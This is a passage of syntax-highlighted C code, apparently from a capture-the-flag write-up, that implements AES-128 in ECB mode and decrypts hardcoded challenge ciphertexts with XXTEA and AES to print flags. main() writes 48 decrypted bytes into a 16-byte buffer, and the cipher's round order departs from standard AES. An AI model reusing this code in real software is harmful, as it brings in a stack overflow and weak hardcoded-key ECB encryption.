aesKey-&gt;dK; <span class="comment">// 解密密钥</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 扩展密钥长度44=4*(10+1)个字,原始密钥128位，4个32位字，Nb*(Nr+1)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* W[0-3],前4个字为原始密钥 */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOAD32H</span>(w[i], key + <span class="number">4</span> * i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* W[4-43] */</span></span><br><span class="line">  <span class="comment">// temp=w[i-1];tmp=SubWord(RotWord(temp))xor Rcon[i/4] xor w[i-Nk]</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ <span class="built_in">MIX</span>(w[<span class="number">3</span>]) ^ rcon[i];</span><br><span class="line">    w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">    w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">    w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">    w += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  w = aesKey-&gt;eK + <span class="number">44</span> - <span class="number">4</span>;</span><br><span class="line">  <span class="comment">// 解密密钥矩阵为加密密钥矩阵的倒序，方便使用，把ek的11个矩阵倒序排列分配给dk作为解密密钥</span></span><br><span class="line">  <span class="comment">// 即dk[0-3]=ek[41-44], dk[4-7]=ek[37-40]... dk[41-44]=ek[0-3]</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">11</span>; ++j)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      v[i] = w[i];</span><br><span class="line">    &#125;</span><br><span class="line">    w -= <span class="number">4</span>;</span><br><span class="line">    v += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轮密钥加</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">addRoundKey</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>], <span class="type">const</span> <span class="type">uint32_t</span> *key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> k[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* i: row, j: col */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      k[i][j] = (<span class="type">uint8_t</span>)<span class="built_in">BYTE</span>(key[j], <span class="number">3</span> - i); <span class="comment">/* 把 uint32 key[4] 先转换为矩阵 uint8 k[4][4] */</span></span><br><span class="line">      state[i][j] ^= k[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字节替换</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">subBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* i: row, j: col */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[i][j] = S[state[i][j]]; <span class="comment">// 直接使用原始字节作为S盒数据下标</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆字节替换</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">invSubBytes</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* i: row, j: col */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[i][j] = inv_S[state[i][j]];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 行移位</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">shiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* i: row */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 便于行循环移位，先把一行4字节拼成uint_32结构，移位后再转成独立的4个字节uint8_t</span></span><br><span class="line">    <span class="built_in">LOAD32H</span>(block[i], state[i]);</span><br><span class="line">    block[i] = <span class="built_in">ROF32</span>(block[i], <span class="number">8</span> * i); <span class="comment">// block[i]循环左移8*i位，如第0行左移0位</span></span><br><span class="line">    <span class="built_in">STORE32H</span>(block[i], state[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆行移位</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">invShiftRows</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint32_t</span> block[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* i: row */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOAD32H</span>(block[i], state[i]);</span><br><span class="line">    block[i] = <span class="built_in">ROR32</span>(block[i], <span class="number">8</span> * i);</span><br><span class="line">    <span class="built_in">STORE32H</span>(block[i], state[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Galois Field (256) Multiplication of two Bytes */</span></span><br><span class="line"><span class="comment">// 两字节的伽罗华域乘法运算</span></span><br><span class="line"><span class="function"><span class="type">uint8_t</span> <span class="title">GMul</span><span class="params">(<span class="type">uint8_t</span> u, <span class="type">uint8_t</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (u &amp; <span class="number">0x01</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      p ^= v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flag = (v &amp; <span class="number">0x80</span>);</span><br><span class="line">    v &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (flag)</span><br><span class="line">    &#123;</span><br><span class="line">      v ^= <span class="number">0x1B</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列混合</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">  <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x01</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x02</span>&#125;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp[i][j] = state[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123; <span class="comment">// 伽罗华域加法和乘法</span></span><br><span class="line">      state[i][j] = <span class="built_in">GMul</span>(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆列混合</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">invMixColumns</span><span class="params">(<span class="type">uint8_t</span> (*state)[<span class="number">4</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">uint8_t</span> tmp[<span class="number">4</span>][<span class="number">4</span>];</span><br><span class="line">  <span class="type">uint8_t</span> M[<span class="number">4</span>][<span class="number">4</span>] = &#123;&#123;<span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>, <span class="number">0x0D</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>&#125;,</span><br><span class="line">                     &#123;<span class="number">0x0B</span>, <span class="number">0x0D</span>, <span class="number">0x09</span>, <span class="number">0x0E</span>&#125;&#125;; <span class="comment">// 使用列混合矩阵的逆矩阵</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* copy state[4][4] to tmp[4][4] */</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp[i][j] = state[i][j];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      state[i][j] = <span class="built_in">GMul</span>(M[i][<span class="number">0</span>], tmp[<span class="number">0</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">1</span>], tmp[<span class="number">1</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">2</span>], tmp[<span class="number">2</span>][j]) ^ <span class="built_in">GMul</span>(M[i][<span class="number">3</span>], tmp[<span class="number">3</span>][j]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES-128加密接口，输入key应为16字节长度，输入长度应该是16字节整倍数，</span></span><br><span class="line"><span class="comment">// 这样输出长度与输入长度相同，函数调用外部为输出数据分配内存</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">aesEncrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *pt, <span class="type">uint8_t</span> *ct, <span class="type">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  AesKey aesKey;</span><br><span class="line">  <span class="type">uint8_t</span> *pos = ct;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.eK; <span class="comment">// 加密密钥指针</span></span><br><span class="line">  <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == pt || <span class="literal">NULL</span> == ct)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (len % BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">  <span class="built_in">keyExpansion</span>(actualKey, <span class="number">16</span>, &amp;aesKey); <span class="comment">// 密钥扩展</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 使用ECB模式循环加密多个分组长度的数据</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 把16字节的明文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">    <span class="built_in">loadStateArray</span>(state, pt);</span><br><span class="line">    <span class="comment">// 轮密钥加</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      rk += <span class="number">4</span>;</span><br><span class="line">      <span class="built_in">subBytes</span>(state);        <span class="comment">// 字节替换</span></span><br><span class="line">      <span class="built_in">shiftRows</span>(state);       <span class="comment">// 行移位</span></span><br><span class="line">      <span class="built_in">addRoundKey</span>(state, rk); <span class="comment">// 轮密钥加</span></span><br><span class="line">      <span class="built_in">mixColumns</span>(state);      <span class="comment">// 列混合</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">subBytes</span>(state);  <span class="comment">// 字节替换</span></span><br><span class="line">    <span class="built_in">shiftRows</span>(state); <span class="comment">// 行移位</span></span><br><span class="line">    <span class="comment">// 此处不进行列混合</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk + <span class="number">4</span>); <span class="comment">// 轮密钥加</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把4x4状态矩阵转换为uint8_t一维数组输出保存</span></span><br><span class="line">    <span class="built_in">storeStateArray</span>(state, pos);</span><br><span class="line"></span><br><span class="line">    pos += BLOCKSIZE; <span class="comment">// 加密数据内存指针移动到下一个分组</span></span><br><span class="line">    pt += BLOCKSIZE;  <span class="comment">// 明文数据指针移动到下一个分组</span></span><br><span class="line">    rk = aesKey.eK;   <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// AES128解密， 参数要求同加密</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">aesDecrypt</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">uint32_t</span> keyLen, <span class="type">const</span> <span class="type">uint8_t</span> *ct, <span class="type">uint8_t</span> *pt, <span class="type">uint32_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  AesKey aesKey;</span><br><span class="line">  <span class="type">uint8_t</span> *pos = pt;</span><br><span class="line">  <span class="type">const</span> <span class="type">uint32_t</span> *rk = aesKey.dK; <span class="comment">// 解密密钥指针</span></span><br><span class="line">  <span class="type">uint8_t</span> out[BLOCKSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> actualKey[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">uint8_t</span> state[<span class="number">4</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="literal">NULL</span> == key || <span class="literal">NULL</span> == ct || <span class="literal">NULL</span> == pt)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;param err.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (keyLen &gt; <span class="number">16</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;keyLen must be 16.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (len % BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;inLen is invalid.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(actualKey, key, keyLen);</span><br><span class="line">  <span class="built_in">keyExpansion</span>(actualKey, <span class="number">16</span>, &amp;aesKey); <span class="comment">// 密钥扩展，同加密</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i += BLOCKSIZE)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 把16字节的密文转换为4x4状态矩阵来进行处理</span></span><br><span class="line">    <span class="built_in">loadStateArray</span>(state, ct);</span><br><span class="line">    <span class="comment">// 轮密钥加，同加密</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; <span class="number">10</span>; ++j)</span><br><span class="line">    &#123;</span><br><span class="line">      rk += <span class="number">4</span>;</span><br><span class="line">      <span class="built_in">invShiftRows</span>(state);    <span class="comment">// 逆行移位</span></span><br><span class="line">      <span class="built_in">invSubBytes</span>(state);     <span class="comment">// 逆字节替换，这两步顺序可以颠倒</span></span><br><span class="line">      <span class="built_in">invMixColumns</span>(state);   <span class="comment">// 逆列混合</span></span><br><span class="line">      <span class="built_in">addRoundKey</span>(state, rk); <span class="comment">// 轮密钥加，同加密</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">invShiftRows</span>(state); <span class="comment">// 逆行移位</span></span><br><span class="line">    <span class="built_in">invSubBytes</span>(state);  <span class="comment">// 逆字节替换</span></span><br><span class="line">    <span class="comment">// 此处没有逆列混合</span></span><br><span class="line">    <span class="built_in">addRoundKey</span>(state, rk + <span class="number">4</span>); <span class="comment">// 轮密钥加，同加密</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">storeStateArray</span>(state, pos); <span class="comment">// 保存明文数据</span></span><br><span class="line">    pos += BLOCKSIZE;            <span class="comment">// 输出数据内存指针移位分组长度</span></span><br><span class="line">    ct += BLOCKSIZE;             <span class="comment">// 输入数据内存指针移位分组长度</span></span><br><span class="line">    rk = aesKey.dK;              <span class="comment">// 恢复rk指针到秘钥初始位置</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> enc[] = &#123;<span class="number">0xf2</span>, <span class="number">0xc0</span>, <span class="number">0x05</span>, <span class="number">0x5f</span>, <span class="number">0x8e</span>, <span class="number">0x73</span>, <span class="number">0x4f</span>, <span class="number">0xbb</span>, <span class="number">0x9c</span>, <span class="number">0xd2</span>, <span class="number">0xf4</span>, <span class="number">0x94</span>, <span class="number">0xc8</span>, <span class="number">0x53</span>, <span class="number">0x4d</span>, <span class="number">0x97</span>, <span class="number">0x2d</span>, <span class="number">0x61</span>, <span class="number">0xfd</span>, <span class="number">0xde</span>, <span class="number">0x73</span>, <span class="number">0x4e</span>, <span class="number">0xdf</span>, <span class="number">0x3d</span>, <span class="number">0xb5</span>, <span class="number">0x5d</span>, <span class="number">0xe4</span>, <span class="number">0x71</span>, <span class="number">0x5a</span>, <span class="number">0xf9</span>, <span class="number">0x3f</span>, <span class="number">0x99</span>, <span class="number">0xfb</span>, <span class="number">0x95</span>, <span class="number">0x12</span>, <span class="number">0x8f</span>, <span class="number">0xc9</span>, <span class="number">0x8b</span>, <span class="number">0x71</span>, <span class="number">0x83</span>, <span class="number">0x7d</span>, <span class="number">0x73</span>, <span class="number">0x60</span>, <span class="number">0xd0</span>, <span class="number">0x76</span>, <span class="number">0x94</span>, <span class="number">0xf5</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0x99</span>, <span class="number">0xdf</span>, <span class="number">0xff</span>, <span class="number">0x1d</span>, <span class="number">0xbf</span>, <span class="number">0x20</span>, <span class="number">0xaf</span>, <span class="number">0x78</span>, <span class="number">0x5d</span>, <span class="number">0x5f</span>, <span class="number">0x54</span>, <span class="number">0x7e</span>, <span class="number">0xcf</span>, <span class="number">0x57</span>, <span class="number">0x7d</span>, <span class="number">0xa0</span>, <span class="number">0xc6</span>, <span class="number">0xe4</span>, <span class="number">0x85</span>, <span class="number">0xf1</span>, <span class="number">0x32</span>, <span class="number">0x56</span>, <span class="number">0x72</span>, <span class="number">0xf9</span>, <span class="number">0x9d</span>, <span class="number">0xa7</span>, <span class="number">0x13</span>, <span class="number">0xe6</span>, <span class="number">0x59</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0xa4</span>, <span class="number">0xca</span>, <span class="number">0x0a</span>, <span class="number">0xcd</span>, <span class="number">0x05</span>, <span class="number">0xdf</span>, <span class="number">0x52</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x4a</span>, <span class="number">0x32</span>, <span class="number">0x49</span>, <span class="number">0x7d</span>, <span class="number">0x0c</span>, <span class="number">0x55</span>, <span class="number">0x0</span>&#125;;</span><br><span class="line">  <span class="type">uint32_t</span> v[] = &#123;<span class="number">1650877538</span>, <span class="number">875968049</span>, <span class="number">842479969</span>, <span class="number">1714696806</span>, <span class="number">862139446</span>, <span class="number">1667380838</span>, <span class="number">912679474</span>, <span class="number">1631019828</span>&#125;;</span><br><span class="line">  <span class="type">uint32_t</span> k[<span class="number">4</span>] = &#123;<span class="number">842610225</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> n = <span class="number">24</span>;</span><br><span class="line">  n = <span class="number">24</span>;</span><br><span class="line">  <span class="built_in">btea</span>((<span class="type">uint32_t</span> *)enc, -n, k);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;xxtea -&gt; %s\n&quot;</span>, enc);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> encrypted[] = &#123;<span class="number">0xb0</span>, <span class="number">0xca</span>, <span class="number">0x9f</span>, <span class="number">0xa0</span>, <span class="number">0xa3</span>, <span class="number">0xee</span>, <span class="number">0x7e</span>, <span class="number">0x58</span>, <span class="number">0x1c</span>, <span class="number">0x46</span>, <span class="number">0xc8</span>, <span class="number">0xca</span>, <span class="number">0x69</span>, <span class="number">0x2f</span>, <span class="number">0xc9</span>, <span class="number">0xb1</span>, <span class="number">0x2a</span>, <span class="number">0xd4</span>, <span class="number">0x33</span>, <span class="number">0xf8</span>, <span class="number">0xa3</span>, <span class="number">0x23</span>, <span class="number">0x2c</span>, <span class="number">0xb6</span>, <span class="number">0xd7</span>, <span class="number">0x3b</span>, <span class="number">0x54</span>, <span class="number">0xcf</span>, <span class="number">0x82</span>, <span class="number">0xe8</span>, <span class="number">0x0c</span>, <span class="number">0x71</span>, <span class="number">0x53</span>, <span class="number">0xba</span>, <span class="number">0x9b</span>, <span class="number">0xb1</span>, <span class="number">0xb2</span>, <span class="number">0xda</span>, <span class="number">0x3e</span>, <span class="number">0x43</span>, <span class="number">0xbe</span>, <span class="number">0x66</span>, <span class="number">0x7d</span>, <span class="number">0x65</span>, <span class="number">0xdc</span>, <span class="number">0x10</span>, <span class="number">0xe5</span>, <span class="number">0xd5</span>, <span class="number">0x0</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> key[] = &#123;<span class="number">0x7a</span>, <span class="number">0x25</span>, <span class="number">0xc5</span>, <span class="number">0x24</span>, <span class="number">0xc6</span>, <span class="number">0x33</span>, <span class="number">0x4c</span>, <span class="number">0x30</span>, <span class="number">0xf3</span>, <span class="number">0x62</span>, <span class="number">0xaf</span>, <span class="number">0xac</span>, <span class="number">0x3f</span>, <span class="number">0x23</span>, <span class="number">0x03</span>, <span class="number">0xd5</span>&#125;;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> decrypted[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="built_in">aesDecrypt</span>(key, <span class="number">16</span>, encrypted, decrypted, <span class="number">48</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;aes ecb -&gt; %s&quot;</span>, decrypted);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 